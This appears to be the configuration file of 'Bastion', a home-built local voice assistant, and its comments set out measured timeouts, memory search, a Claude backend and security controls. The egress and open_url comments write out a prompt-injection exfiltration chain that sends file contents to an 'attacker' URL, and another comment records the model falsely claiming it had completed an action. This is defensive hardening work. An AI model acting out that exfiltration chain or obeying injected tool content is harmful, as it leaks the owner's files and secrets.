"""
Bastion configuration — edit this file to personalise your setup.
Everything security-sensitive (whitelists, path restrictions) lives here
so there is one clear place to audit.
"""

import re
from pathlib import Path

# ─── Ollama ───────────────────────────────────────────────────────────────────
# Bound to localhost only — never reachable from another machine.
OLLAMA_HOST = "http://127.0.0.1:11434"

# qwen3:8b fits in 8GB VRAM and REASONS (chain-of-thought) before answering, while
# still calling tools. chat() runs it in a hybrid mode: thinking OFF for quick
# commands (open/close/volume → ~1s) and ON for real questions (deep, ~15-20s).
# Falls back well; set MODEL = "qwen2.5:7b" for the older fast/no-reasoning model.
MODEL = "qwen3:8b"

# How long Ollama keeps the CHAT model resident after a turn. Ollama's own
# default is 5 minutes (confirmed from expires_at), and a conversational gap
# longer than that costs a cold load: MEASURED, 5.4 s to first token cold vs
# 285 ms warm. the owner's gaps are routinely longer than five minutes, so the
# default is set to expire in the middle of ordinary use.
#
# Deliberately NOT "-1" (pin forever), for the same reason MEMORY_EMBED_KEEP_ALIVE
# isn't: qwen3:8b alone is 6186 of 8188 MiB. What "-1" would buy is only the
# 30-minute-plus gap, and what it risks is the eviction cliff — moondream loading
# for "look at my screen" already evicts qwen outright (measured, 6.7 s on the
# next turn), and a pinned model is the wrong thing to be arguing with the
# allocator about on a GPU that is 76% full before anything else loads.
#
# 30m spans a working session and matches the embedder, so the two models age
# out together rather than one quietly outliving the other.
OLLAMA_KEEP_ALIVE = "30m"

# Context window, in tokens. Sent as num_ctx on every model call.
#
# 2026-08-18: 8192 -> 4096, because at 8192 the model DOES NOT LOAD on this
# machine any more. Measured four consecutive times: the tensors reach the GPU
# fine, then llama-server sticks on "warming up the model with an empty run" at
# 100% GPU utilisation with 196 MiB of VRAM free, and Ollama's own 5-minute load
# timeout eventually returns HTTP 500 (303.7 s, four times, identical). At 4096
# the same model loaded and answered in 4.6 s. The KV cache is the difference:
# 1152 MiB at 8192 against roughly half that at 4096, on a card that had nothing
# left to give.
#
# The cost is real and the owner should know it: Bastion remembers about half as much
# of a conversation before older turns fall out of the window. MAX_HISTORY_CHARS
# and MAX_TOOL_RESULT_CHARS below were both sized for an 8k window, so they are
# now generous rather than tight; the runner is started with --context-shift, so
# an overflow truncates rather than errors.
#
# Put back to 8192 once the card has room - the honest test is whether a load
# completes, not whether the number looks better.
OLLAMA_NUM_CTX = 4096

# ─── LLM backend: the local model, or Claude (the second outbound exception) ──
#
# READ THIS BEFORE CHANGING THE DEFAULT.
#
# Bastion can answer from one of two places, chosen by LLM_BACKEND and switchable
# at runtime ("Bastion, switch to Claude" / "switch to local"):
#
#   "ollama"  qwen3:8b on this machine. THE DEFAULT, and the identity of the
#             project. Not a word leaves the box.
#   "claude"  Anthropic's Sonnet, reached by running the Claude Code CLI as a
#             subprocess (backends.py). It uses the owner's existing SUBSCRIPTION
#             LOGIN, not an API key — deliberate, so there is no per-use billing
#             (`apiKeySource: "none"` in the CLI's own output confirms it).
#
# WHAT LEAVES THE MACHINE IN CLAUDE MODE, stated plainly because it is the whole
# security cost of this feature: the ENTIRE PROMPT. That means the system
# prompt, the owner's transcribed SPEECH, Bastion's replies, and every tool result
# still inside the history window — file listings, screen text, clipboard
# contents, memories, system stats. It goes to Anthropic's servers over the
# CLI's own authenticated connection. Nothing is redacted, because a voice
# assistant that redacts the question cannot answer it.
#
# WHEN it leaves: only while LLM_BACKEND is "claude", or after someone has said
# "switch to Claude" in this session. In "ollama" mode the CLI is never
# launched and nothing is sent — the fallback runs in that direction only.
#
# HOW TO TURN IT OFF, in increasing order of firmness:
#   - say "Bastion, switch to local" (takes effect immediately, that session)
#   - LLM_BACKEND = "ollama" below (the default; the boot state)
#   - CLAUDE_ENABLED = False (the switch stops working at all; nothing can turn
#     it on without editing this file)
#
# This is the SECOND deliberate outbound exception, after alerts.py, and the owner
# approved it explicitly on 2026-08-18 after a long back-and-forth. It is not a
# precedent: alerts.py remains metadata-only, and any OTHER new outbound call is
# still a security finding. Note the asymmetry — alerts.py sends failure
# metadata and never user content; this sends user content and nothing else.
LLM_BACKEND = "ollama"

# Hard off switch. False makes "claude" unreachable however LLM_BACKEND is set
# and whatever anyone says out loud.
CLAUDE_ENABLED = False   # optional cloud backend, off by default

# Empty = look "claude" up on PATH (on Windows the .cmd shim is preferred; the
# extensionless npm file is a shell script CreateProcess cannot run). Measured
# 2026-08-18: %APPDATA%\npm\claude.cmd, CLI version 2.1.235.
CLAUDE_CLI_PATH = ""

# An alias ("sonnet", "opus", "fable") or a full model name.
CLAUDE_MODEL = "sonnet"

# The CLI has its own tool set — Bash, Read, Edit, WebFetch and the rest. Bastion
# dispatches its OWN tools through tools.py, behind ALLOWED_READ_DIRS,
# ALLOWED_APPS and the rest of the policy in this file. A CLI free to read files
# and run commands would be a second tool surface with none of that, so they are
# denied. Do not shorten this list to make something work.
#
# THE NAMED LIST WAS NOT ENOUGH AND THIS IS WHY THE WILDCARD IS FIRST. Measured
# 2026-08-18 by dumping the CLI's own `init` line during a real Bastion turn: with
# only the names below, sixteen OTHER tools were live in every Claude turn the owner
# took — ToolSearch, Skill, Workflow, Monitor, SendMessage, PushNotification,
# RemoteTrigger, ReportFindings, CronCreate, CronDelete, CronList,
# ScheduleWakeup, DesignSync, EnterWorktree, ExitWorktree, ShareOnboardingGuide.
# A denylist of names cannot cover a tool set that grows with each CLI release.
#
# It was not theoretical, either. ToolSearch is what BROKE tv_control: asked "is
# the 32 inch Roku on", the model called ToolSearch("tv_control"), got back "No
# matching deferred tools found", concluded Bastion's tool did not exist, and told
# the owner it was unreachable. Its own tool surface was answering questions about
# Bastion's.
#
# "*" disables all of them — verified against CLI 2.1.235: the init line reports
# `"tools": []`. The names are kept after it so the intent survives if a future
# version stops honouring the wildcard, and so this reads as a list rather than a
# magic character. Only ever LENGTHEN this.
CLAUDE_DISALLOWED_TOOLS = (
    "* "
    "Bash Read Write Edit NotebookEdit Glob Grep WebFetch WebSearch Task "
    "TodoWrite KillShell BashOutput SlashCommand "
    "ToolSearch Skill Workflow Monitor SendMessage PushNotification "
    "RemoteTrigger ReportFindings CronCreate CronDelete CronList "
    "ScheduleWakeup DesignSync EnterWorktree ExitWorktree ShareOnboardingGuide"
)

# Working directory for the subprocess. Empty inherits Bastion's. --safe-mode is
# what actually keeps this project's CLAUDE.md, hooks, skills and MCP servers
# out of the call; without it, asking about the weather would load the agent
# team's instructions and fire the Discord activity hook.
CLAUDE_CWD = ""

# Deadlines, in the spirit of OLLAMA_STALL_TIMEOUT_S: the CLI is a subprocess
# and must never hang a voice turn. The first is an inactivity deadline (no
# output at all), the second a hard cap on one round; both kill the process
# tree. Measured 2026-08-18: 1,026 ms to first token, 4.0 s for a whole trivial
# turn, against roughly 26 s to first token on the local model.
CLAUDE_STALL_TIMEOUT_S = 30
CLAUDE_TURN_TIMEOUT_S  = 120

# ─── The persistent Claude process ───────────────────────────────────────────
# Spawning the CLI per turn spends node's startup before a single token exists.
# Measured 2026-08-18 against Bastion's REAL system prompt and full tool list,
# same question, same machine: a fresh process reaches first token in 2.20-2.41 s
# (4 samples), a warm one in 1.45-1.70 s (4 samples). SO THE SAVING IS ~0.6-0.9 s
# PER TURN, not the ~1.4 s a bare-prompt probe suggests — with the real 8 KB
# prompt and ~60 tools, processing the input is a large part of what remains,
# and no amount of warmth removes that. The second, larger saving is that a long
# conversation stops being re-uploaded every round; see _ClaudeSession.
#
# It is a CACHE, never a dependency: dead, wedged, or never started all still
# answer the turn — backends.py respawns, and failing that spawns a one-shot
# process exactly as before. False here turns the whole optimisation off and
# every turn goes back to its own process.
CLAUDE_PERSIST = True

# When a warm process is thrown away and the next turn starts a new one from
# the (trimmed) history Bastion holds.
#
# Why each of these exists, because tuning them blind is worse than leaving
# them alone:
#   TURNS — the process accumulates the conversation internally, and
#     MAX_HISTORY_MESSAGES no longer bounds it once it does. This is the cap
#     that puts the bound back: on recycle the next process is seeded from the
#     trimmed history, so context cannot grow without limit across a session.
#     It also bounds what a single leaked process could cost.
#   IDLE — warmth is only worth anything WITHIN a conversation. A process
#     untouched for a quarter of an hour is holding a stale context that costs
#     input tokens on every future turn, for a saving that has already expired.
#   AGE — a backstop against a process that is somehow neither busy nor idle.
# A protocol error, an exit, or an abandoned mid-turn stream discards the
# process immediately, whatever these say.
CLAUDE_SESSION_MAX_TURNS = 30
CLAUDE_SESSION_IDLE_S    = 900
CLAUDE_SESSION_MAX_AGE_S = 7200

# WHICH LOGIN A WARM PROCESS IS SPENDING. The CLI reads its credentials once, at
# startup, from one machine-wide file — verified 2026-08-18: this file's mtime
# moved the moment the owner ran /login and changed accounts. A per-turn subprocess
# therefore re-reads it every turn, and an account switch in his terminal took
# effect on Bastion's very next turn. A long-lived process would keep spending
# the account it started with until it happened to recycle, silently billing
# someone else — several people share this machine.
#
# So the file's mtime and size are checked when the process is handed out, and a
# process older than the current credential is discarded. That is one stat per
# round, next to nothing, and it restores exactly the behaviour a per-turn
# subprocess had. It FOLLOWS the machine's login; it does not choose between
# logins, and nothing here rotates or switches accounts — the owner asked about that
# separately and it was declined. Empty = ~/.claude/.credentials.json.
CLAUDE_CREDENTIALS_PATH = ""

# `claude auth status` answers "whose subscription is Bastion spending" — email,
# org and plan. Measured 2026-08-18: 0.61 s. That is invisible once per process
# spawn, where backends.py runs it in the background, and unaffordable per turn,
# where it is never run. The deadline only exists so a hung CLI cannot leave the
# lookup thread alive for ever; a lookup that fails simply means "unknown", which
# is a perfectly good answer and never an error anyone has to handle.
CLAUDE_AUTH_TIMEOUT_S = 15

# ─── Ollama request deadlines ────────────────────────────────────────────────
# An INACTIVITY deadline, not a duration cap: httpx's read timeout is per socket
# read, which on a streamed response means "time since the last chunk". A long
# healthy generation resets it on every token, so only silence is punished.
# Calibrated 2026-08-17, warm, real turns: first chunk 1.1-1.2 s, worst gap
# BETWEEN chunks 0.17 s. Thinking streams, so a 29.4 s think is not a silence.
#
# Why this exists: Ollama wedged TWICE on 2026-08-17 (~22:36 and ~22:57) and
# Bastion sat mute for minutes with nothing in the log. /api/tags answered in
# 43 ms while chat returned nothing at all — the HTTP thread was fine and the
# inference slot was stuck. Every other subsystem here had a timeout; the one
# call that matters had none.
OLLAMA_STALL_TIMEOUT_S      = 45    # no bytes for this long = wedged; give up
# A model that is not resident sends nothing while it loads — measured over
# 3 min off E:\ollama\models. Residency is checked (/api/ps, ~3 ms) and this
# budget used instead, so a cold load is never mistaken for a wedge.
OLLAMA_COLD_LOAD_TIMEOUT_S  = 300
OLLAMA_CONNECT_TIMEOUT_S    = 5     # loopback — Ollama is up or it isn't
OLLAMA_STARTUP_TIMEOUT_S    = 15    # bounds check_ollama()'s model listing
# Spoken aloud when the deadline fires. No detail the owner can't act on.
OLLAMA_STALL_MESSAGE = (
    "Sir, the local model has stopped responding — I've given up waiting on it. "
    "Ollama may need a restart."
)
# Said instead of the line above when the wedged runner was found and killed, so
# the owner is told to retry rather than sent to restart something already fixed.
OLLAMA_STALL_RECOVERED_MESSAGE = (
    "Sir, the model process had locked up. I've cleared it — ask me again and it "
    "should answer."
)

# ─── Wedge recovery ─────────────────────────────────────────────────────────
# When the stall deadline above fires, wedge.py probes the llama-server child and
# kills it if — and only if — it shows the measured wedge signature: /health
# answering while /slots hangs. `ollama serve` is never touched; it is healthy
# during a wedge, and restarting it would evict the model and turn a ~20 s
# recovery into a cold load.
#
# Why this is safe rather than a coin flip: /slots was probed 8 times DURING a
# live generation and answered 200 in 0-47 ms every time, with
# is_processing=True (`wedge-hunt`, 2026-08-17). A busy runner and a wedged one
# are not remotely alike, so a healthy answer is never mistaken for a stall.
# Set False to go back to reporting the stall and doing nothing about it.
WEDGE_RECOVERY_ENABLED = True
WEDGE_PROBE_TIMEOUT_S  = 5     # a healthy /slots answers in under 50 ms
WEDGE_PS_TIMEOUT_S     = 15    # bounds the Get-CimInstance / Stop-Process calls

# The SECOND wedge shape, observed live 2026-08-18 17:14 and not in wedge-hunt's
# original write-up: the runner loads its tensors onto the GPU fine, then sticks
# in "warming up the model with an empty run" at 100% GPU utilisation with
# 196 MiB of VRAM free, answering 503 "Loading model" forever. It never reaches
# /health 200, so the /slots probe cannot see it at all.
#
# A genuine cold load off E: (an HDD) legitimately sits at 503 for over three
# minutes, so a 503 is only a fault once it has outlived the cold budget. Below
# that, the runner is left alone. Defaults to OLLAMA_COLD_LOAD_TIMEOUT_S.
WEDGE_LOADING_KILL_AFTER_S = OLLAMA_COLD_LOAD_TIMEOUT_S

# SPLIT thinking. A tool turn used to reason TWICE — once to choose the tool, then
# again to phrase a result it had just been handed. The second one bought almost
# nothing: measured 2026-08-17, first content 10,254 -> 4,914 ms median, and tool
# selection was identical 16/16 across policies. Round 1 is untouched, so this
# cannot affect which tool gets picked.
THINKING_SPLIT = True   # think to CHOOSE a tool, not to phrase its result. False = reason on every round (pre-2026-08-17 behaviour).

# Conversational follow-up: when Bastion's reply ends in a question, auto-open the
# mic for your answer so you don't have to say "Bastion" again. Silence ends it.
FOLLOW_UP_ON_QUESTION = True

# Voice/screen split: speak the short half of a long reply and put the rest on the
# wallpaper HUD, rather than reading the whole thing aloud. The budget itself is
# hud_server.HUD_SPOKEN_MAX_CHARS (240) — deliberately NOT duplicated here.
#
# Worth knowing before judging it: the median reply is ~306 chars, so this fires
# on MOST turns. Out of sight of the vertical monitor you get roughly the first
# two thirds of an answer and "the rest is on the screen". That is the feature
# working, not a fault — but it is a real change in how the assistant feels, so
# this is the first switch to flip if Bastion seems to be cutting itself off.
#
# Turned OFF at 17:50 on 2026-08-20 and back ON at 18:16 the same evening. Worth
# keeping the reason, because the failure was invisible and could recur:
# the split hands the remainder of a long reply to the HUD `detail` panel, and
# that panel had only ever been built into wallpaper/index.html (the portrait
# build). When the vertical monitor was unplugged, wallpaper_h became the live
# HUD and the tail of every long answer was written to a surface that did not
# exist. Nothing errored and no test caught it — the render test was pointed at
# the build nobody was looking at.
#
# `hud-dev` ported the panel into wallpaper_h the same evening (see TEAM-LOG),
# and it is verified on the real 32" TCL, so this is back on. If a THIRD
# wallpaper build ever appears, the thing to check before trusting this switch
# is whether the build actually on screen renders `detail`.
HUD_VOICE_SPLIT = True   # False = say the whole reply, show nothing.

# ─── Safety limits ────────────────────────────────────────────────────────────
MAX_TOOL_CALLS_PER_TURN = 5      # breaks runaway tool-call loops

# How many times one tool may be called with the SAME action inside one turn
# before dispatch() stops running it and tells the model to answer instead.
# MAX_TOOL_CALLS_PER_TURN is the backstop that catches a runaway loop after it
# has already burned the turn; this catches the specific loop that causes it.
# On 2026-08-18 "turn on the 32-inch Roku TV" succeeded on round one and the
# model then called tv_control status FIVE more times, hit the limit, and said
# nothing at all. Below 2 would break legitimate "check, act, re-check" turns.
TOOL_REPEAT_LIMIT = 2

# Said aloud when the model produces NO words at all. Silence is the worst
# possible failure here: it is indistinguishable from Bastion being dead, and on
# 2026-08-18 the owner reported exactly that as "taking forever" — the turn had in
# fact finished, having turned his TV on, and simply said nothing.
#
# TOOL_LIMIT_MESSAGE is the version for a turn that burned MAX_TOOL_CALLS_PER_TURN
# and still could not phrase an answer. It deliberately does NOT claim success or
# failure, because at that point nothing in the loop knows which it was — it
# points at the HUD, where the tool results actually are.
TOOL_LIMIT_MESSAGE = (
    "Sir, that took more steps than I allow in one turn, so I've stopped. "
    "What I did get done is on the screen."
)
EMPTY_REPLY_MESSAGE = (
    "Sir, I've nothing to say to that — which is a fault, not an opinion. "
    "Try me again."
)

# Said INSTEAD of a reply that claims an action no tool performed. The system
# prompt's first rule is "Never produce a confirmation or report a result you
# did not get from a tool in this same turn", and on 2026-08-18 Claude broke it
# in exactly the shape this catches: "Done, sir — the 32 inch Roku should be
# powering on now", with no tool call behind it and a TV that stayed off. A
# turn that says nothing is a bad turn; a turn that says it did something it
# did not is a WORSE one, because the owner acts on it. This fires only after the
# forced-tool retry has already been spent, so the model has declined to call a
# tool twice while holding the tool list.
FABRICATED_ACTION_MESSAGE = (
    "Sir, I was about to tell you that's done — but I never actually called "
    "the tool, so I'd have been making it up. Ask me again."
)
MAX_HISTORY_MESSAGES    = 40     # keep last N messages; bounds RAM use
MAX_READ_BYTES          = 51_200 # 50 KB — prevents reading huge files into context
MAX_SEARCH_RESULTS      = 5
MAX_QUERY_LEN           = 256
MAX_MEMORY_KEY_LEN      = 128
MAX_MEMORY_VALUE_LEN    = 2_048

# How many rows a bare recall() (no key) returns. Memory is model-writable, so
# this is also the flood budget: past this many entries the oldest scroll out of
# reach, which is how injected writes evict real ones. Keep it small enough that
# the whole list stays readable and the owner can spot a row he didn't dictate.
MEMORY_RECALL_LIMIT     = 30

# ─── Semantic memory ──────────────────────────────────────────────────────────
# Memory used to be exact-key only: a note filed under "mechanic" was invisible
# to "what did I say about the car". Every stored row now also carries an
# embedding of its "key: value" text, and a recall() that finds no exact key
# falls back to ranking rows by cosine similarity against the query.
#
# The model runs in the SAME local Ollama as the LLM (127.0.0.1:11434,
# /api/embeddings), so this adds no dependency, no new host and nothing leaves
# the machine. 768 dimensions, stored as packed float32 in a BLOB (~3 KB/row).
# Changing this model changes the vector length; rows embedded with the old one
# are simply skipped by the search (dimension mismatch), not misread, so the fix
# is to clear the embedding column and let the backfill re-run.
MEMORY_EMBED_MODEL = "nomic-embed-text"

# Short by design: recall() sits in the VOICE path, where the cost of waiting is
# the owner hearing silence. MEASURED on this box (RTX 4060, 8188 MiB, qwen3:8b
# resident at 6186 MiB):
#   warm embed                          24-75 ms
#   cold embed, GPU otherwise quiet     640-920 ms
#   embed issued while moondream loads  8300 ms   ← the real failure mode
# The last one is why this is 3 s rather than 10. Vision loading is the one
# routine event that puts three models in 8 GB, and an embed submitted during it
# queues behind the load. Three seconds clears a genuine cold load with margin
# and cuts off the queue case, where recall falls back to exact-key matching —
# an instant, slightly worse answer instead of an eight-second pause mid-turn.
# Do not raise this to "make semantic recall more reliable": the failure it
# would then wait through is precisely the one worth not waiting through.
#
# Measured end to end with the model evicted AND vision loading — the genuine
# worst case — recall returned its degraded answer at 3015 ms and the next call
# succeeded in 1001 ms. So 3 s is the ceiling on how long memory can stall a
# turn. Drop to 2 if that pause is audible enough to bother the owner; a cold load
# on a quiet GPU is 640-920 ms, so 2 s still clears one with margin.
MEMORY_EMBED_TIMEOUT_S = 3

# How long Ollama keeps the embedding model resident after a call. The default
# is 5 minutes and it was observed evicting nomic between two runs of the same
# test session, which would make the owner pay the ~900 ms cold path repeatedly
# during ordinary use. 30 minutes spans a working session instead.
#
# Deliberately NOT "-1" (pin forever). qwen3:8b alone is 6186 of 8188 MiB, so the
# GPU is 76% full before anything else loads; adding a permanently pinned 323 MB
# makes it likelier that the chat model is what gets evicted when vision loads.
# A nomic reload is under a second and degrades gracefully — it is the cheapest
# thing on the GPU to lose, so it should stay the most willing to go.
MEMORY_EMBED_KEEP_ALIVE = "30m"

# Truncate before embedding rather than letting the server silently cut. This
# model's context_length is 2048 TOKENS. The longest text we can build is
# MAX_MEMORY_KEY_LEN + MAX_MEMORY_VALUE_LEN ≈ 2180 chars ≈ 550-700 tokens, so
# this guard cannot fire today — it is here so that raising either cap above
# degrades the vector loudly in the log instead of quietly embedding a fragment.
MEMORY_EMBED_MAX_CHARS = 4_000

# How many semantic matches recall() returns, and how similar they must be.
MEMORY_SIMILARITY_TOP_K = 3

# RAW cosine on this model has a very high FLOOR: two entirely unrelated English
# sentences sit around 0.40, not near 0, and the whole corpus points in roughly
# one direction. Measured here, raw scores were true matches 0.46-0.77 against
# non-matches 0.35-0.50 — overlapping ranges, so no raw cutoff separates them.
# At 0.45 the search returned a router note for "how do I bake sourdough bread";
# at 0.50 it lost "what did I say about the car" (0.472), the case this feature
# exists for. That is a measured failure of two real settings, not a worry.
#
# The fix is to subtract that shared direction: score against the CENTRED
# vectors, i.e. cosine(query - corpus_mean, row - corpus_mean). Same queries,
# same rows, and the ranges stop overlapping:
#   true matches            0.19-0.42
#   unrelated queries       0.03-0.15
# 0.18 sits in the gap, and held on BOTH a 4-row and an 8-row corpus, so it is
# not a fit to one particular set of notes. The one thing that still comes back
# is "set a timer for ten minutes" against a note reading "hold the button for
# 10 seconds then wait two minutes" — which is a fair match, not a false one.
MEMORY_CENTERED_THRESHOLD = 0.18

# Centring needs a corpus to have a mean: with one row every centred vector is
# zero, and with two the mean sits exactly between them. Below this many rows the
# search falls back to the raw cosine and the raw threshold underneath. That is
# the weaker filter, but with one or two notes stored there is nothing to confuse
# them with, and it was still enough to reject "capital of France" against a
# single stored note (0.35 vs 0.47).
MEMORY_CENTERING_MIN_ROWS   = 3
MEMORY_SIMILARITY_THRESHOLD = 0.45

# Relative cutoff applied after the threshold: keep only rows scoring at least
# this FRACTION of the best one. Stops a strong single hit being padded out to
# top-k with rows that merely cleared the floor. A fraction rather than a fixed
# distance because it has to hold on both scoring scales above.
MEMORY_SIMILARITY_MARGIN_FRAC = 0.75

# Rows written before this feature (and any whose embed call failed) have no
# vector. They are backfilled a few at a time — at init, and again when a
# semantic search runs and Ollama has just been shown to be alive. Each row is
# committed on its own, so a backfill interrupted half way simply resumes; the
# only state is "embedding IS NULL". Bounded because init runs at startup and
# must not sit there embedding a thousand rows before Bastion says hello.
MEMORY_BACKFILL_BATCH = 25

# The batch used when the catch-up runs from recall() instead of from init.
# Much smaller, because that one is on the VOICE path: 25 rows at ~50 ms each is
# a second and a half of silence added to a turn the owner is waiting through, and
# the rows will be picked up by the next call or the next startup anyway.
MEMORY_BACKFILL_BATCH_RECALL = 5

# Hard cap on the text ANY tool hands back to the model, applied centrally in
# tools.dispatch(). The model's context window is OLLAMA_NUM_CTX tokens (4096
# since 2026-08-18), while read_file alone may return MAX_READ_BYTES = 50 KB — one
# result could fill or overflow the entire window, silently pushing the system
# prompt (which carries the refusal rules) out of context. Truncation is made
# VISIBLE in the returned string so the model knows it saw a fragment rather
# than believing it read the whole thing.
# ~6 KB ≈ 1.5-2k tokens: room for a long answer plus history in an 8k window.
# This does NOT replace MAX_READ_BYTES — that one stops a huge file being read
# at all; this one bounds what any tool, present or future, can inject.
MAX_TOOL_RESULT_CHARS   = 6_000

# Companion cap: the total size of the NON-SYSTEM history sent to the model.
# MAX_TOOL_RESULT_CHARS bounds ONE result; this bounds their SUM, which the
# per-result cap does not — five capped results in a single turn are already
# 30 KB, and MAX_HISTORY_MESSAGES (a message COUNT) does not notice size at all.
#
# What overflow actually does, MEASURED against qwen3:8b rather than assumed
# (this settles the open question in finding #13, and the answer is narrower
# than the finding supposed). The system prompt is ~7.5 KB and the tool schemas
# ~9.7 KB, both sent every call, so ~4.3k of the 8192 tokens are spent before
# any history. Past that, with the same ~44 KB of filler and a codeword defined
# only in the system message:
#   - as ONE oversized message      → prompt_eval clamped to 4098, the model had
#                                     LOST the system prompt and answered wrong.
#   - split across several messages → Ollama dropped whole OLD messages and KEPT
#                                     the system one; the answer stayed correct.
# So eviction is a SINGLE-MESSAGE phenomenon, and MAX_TOOL_RESULT_CHARS above is
# what actually prevents it — no tool can produce a message that big. Do not
# raise that one thinking this cap covers it; they close different holes.
#
# This cap bounds the SUM, which the per-result cap does not: five capped results
# in a turn are 30 KB, and MAX_HISTORY_MESSAGES counts messages without noticing
# size. Ollama would trim that itself, opaquely; trimming here makes the choice
# ours, deterministic, and guarantees message[0] survives.
#
# ~10 KB ≈ 2.5k tokens, which fits alongside the prompt and schemas with room to
# generate. Raising it hands the decision back to Ollama.
MAX_HISTORY_CHARS       = 10_000

# fetch_url follows redirects by hand, re-checking every hop against safe_url,
# because requests' own redirect handling would let a permitted first hop bounce
# to 127.0.0.1 or 169.254.169.254 behind the SSRF guard's back. This bounds how
# many hops it will chase before giving up.
FETCH_MAX_REDIRECTS     = 3

# open_url hands a URL to the REAL browser, so it is a different animal from
# fetch_url: the request carries the owner's cookies and logged-in sessions, and the
# reply never comes back through Bastion where a guard could inspect it. That
# makes an internal address WORSE here than in fetch_url, not better — hence
# block_private=True on both (see open_url in tools.py).
#
# The other half of the browser risk is the URL itself: everything after the
# host is attacker-choosable payload, so "read this file, then open
# https://attacker/?d=<contents>" is a complete exfil in two calls. The
# QUERY STRING AND FRAGMENT are length-capped so that even an approved host
# can't have a document posted through it. Genuine links carry short tokens (a
# YouTube id is 11 chars); dumping a document needs thousands.
# Lower this if you never open long tracking URLs; raise it only knowingly.
# (The destination itself is governed by the egress policy below.)
OPEN_URL_MAX_QUERY_LEN  = 256

# ─── Egress policy: where the model is allowed to send bytes ──────────────────
# Finding #4. The fence around tool results (UNTRUSTED_* above) is a SOFT
# control — it asks an 8B model to treat text as data. This is the hard one.
# With no destination policy, "read_file / clipboard, then fetch_url(
# 'https://attacker/?d=<contents>')" is a complete exfil in two tool calls, and
# nothing downstream can tell that apart from summarising an article.
#
# A HOST allowlist is what breaks the chain: an attacker who cannot choose the
# destination cannot collect the data. Secrets pushed at wikipedia.org land in
# someone else's logs, unreadable by the injector. That is why these lists must
# stay short and must never gain a host that accepts arbitrary content back out
# (a pastebin, a URL shortener, a webhook relay, a request-bin, a Discord or
# Slack webhook host, a gist, a file host). Such an entry re-opens the finding
# on its own — adding one is a security decision, not a convenience tweak.
#
# Matching is by HOST, parsed with urlsplit and compared exactly, or as a
# dot-anchored subdomain ("wikipedia.org" also permits "en.wikipedia.org").
# Never by prefix: "en.wikipedia.org".startswith() would also accept
# en.wikipedia.org.evil.com, a registrable attacker domain. Port and userinfo
# are ignored by design — hostname is what the connection actually goes to, so
# https://en.wikipedia.org@evil.com/ is correctly read as evil.com.

# fetch_url is silent, unauthenticated and returns the body into context. It is
# the pure exfil sink, so it is a HARD refusal off this list, no prompt. Every
# hop of a redirect chain is checked, not just the first — otherwise a 302 from
# an allowlisted host is a one-line bypass of the whole policy.
#
# The contents are exactly the hosts Bastion's own tools already talk to, so
# nothing that worked before this policy stops working:
FETCH_URL_ALLOWED_HOSTS: frozenset[str] = frozenset({
    "open-meteo.com",         # weather + geocoding (api. and geocoding-api.)
    "wikipedia.org",          # wikipedia()
    "news.google.com",        # news_headlines() RSS
    "api.frankfurter.app",    # convert_currency()
    "api.dictionaryapi.dev",  # define_word()
    "router.project-osrm.org",# get_directions()
    # duckduckgo.com is deliberately NOT here. web_search() reaches it through
    # the DDGS library, not through fetch_url, so nothing needs it — and its
    # /l/?uddg= endpoint is an open redirect to any URL. The per-hop check
    # catches that, but a host that forwards anywhere doesn't belong on a list
    # whose whole job is fixing the destination.
    #
    # RFC 2606 reserved documentation domain. Serves a static page with no user
    # content, so it cannot relay anything back to an injector; it is here
    # because test_newtools.py fetches it as its live-network check. Safe to
    # delete along with that test line.
    "example.com",
})

# open_url hands the URL to the REAL browser, where the owner watches the result —
# so an outright allowlist would just be annoying ("open YouTube"). Off-list
# hosts therefore need one physical click on the same out-of-band Win32 box the
# clipboard read uses; on-list hosts open with no friction. Note the asymmetry
# is deliberate: fetch_url is silent, open_url is not.
#
# This starts as the fetch list plus nothing. Add the sites you actually ask
# Bastion to open — "youtube.com", "github.com" — to stop being asked each time.
# Everything else still works, it just costs a click.
OPEN_URL_ALLOWED_HOSTS: frozenset[str] = FETCH_URL_ALLOWED_HOSTS

# How long the off-list open_url confirmation waits before giving up. Timing out
# counts as NO, same as the clipboard prompt — and for the same reason, it must
# expire or an unattended machine hangs the turn.
OPEN_URL_CONFIRM_TIMEOUT_S = 45

# ─── Untrusted-content fence ──────────────────────────────────────────────────
# Every tool result is text neither Bastion nor the owner wrote — web pages, search
# results, RSS headlines, file contents, screen text, the clipboard, stored
# memories. Unfenced it lands in history looking exactly like trusted
# conversation, which is what makes prompt injection work at all (findings #3).
# bastion.fence_tool_result() wraps each one in these markers, and the
# UNTRUSTED CONTENT block in SYSTEM_PROMPT teaches the model to distrust them.
#
# Changing these means changing the system prompt to match, or the model is
# being taught to distrust a marker it will never see.
UNTRUSTED_OPEN_TAG  = "<untrusted_content"
UNTRUSTED_CLOSE_TAG = "</untrusted_content>"

# What gets neutralised inside fenced content: the marker WORD, not the tag.
# Stripping the literal closing tag would miss "< / untrusted_content >" and
# every other bracket/whitespace variant; killing the word kills all of them.
UNTRUSTED_MARKER_WORD = "untrusted_content"

# ─── File access ──────────────────────────────────────────────────────────────
_HOME = Path.home()

# Bastion may READ from these directories only.
ALLOWED_READ_DIRS: list[Path] = [
    _HOME / "Documents",
    _HOME / "Desktop",
    _HOME / "Downloads",
]

# Only these extensions can be read. This keeps BINARIES out; it does NOT keep
# credentials out — .json, .csv, .cfg, .ini, .yaml and .env-ish files under
# Downloads and Documents is exactly where OAuth credentials.json, exported
# password CSVs and token-bearing config live. ALLOWED_READ_DIRS above is the
# real control here; this list is a second, weaker one. (Corrected during the
# 2026-08-16 review, which found the old "prevents loading creds" comment false.)
SAFE_READ_EXTENSIONS: frozenset[str] = frozenset({
    ".txt", ".md", ".csv", ".json", ".log",
    ".py",  ".html", ".xml", ".ini", ".cfg",
    ".rst", ".toml", ".yaml", ".yml",
})

# ─── Application whitelist ────────────────────────────────────────────────────
# ONLY these apps can be launched by Bastion. Add paths for apps you use.
# shell=False is enforced in the launcher — these are passed directly to the OS.

# Discord installs into a version-stamped folder (app-x.y.z) that changes on
# update, so resolve the newest match at load instead of hard-coding a version.
#
# Sorted by PARSED VERSION NUMBER, not by name. sorted(reverse=True) on the raw
# paths is lexicographic, so a planted "app-zzz\Discord.exe" would have won over
# every real version — and %LOCALAPPDATA% is user-writable. Requires pre-existing
# arbitrary write to exploit (persistence, not an entry point), but a numeric
# sort is no more code than a lexicographic one and folders that don't match
# app-<digits>.<digits>.<digits> are ignored outright.
def _app_version(path: Path) -> tuple[int, ...]:
    m = re.fullmatch(r"app-(\d+(?:\.\d+)*)", path.parent.name)
    return tuple(int(p) for p in m.group(1).split(".")) if m else ()

_discord = sorted(
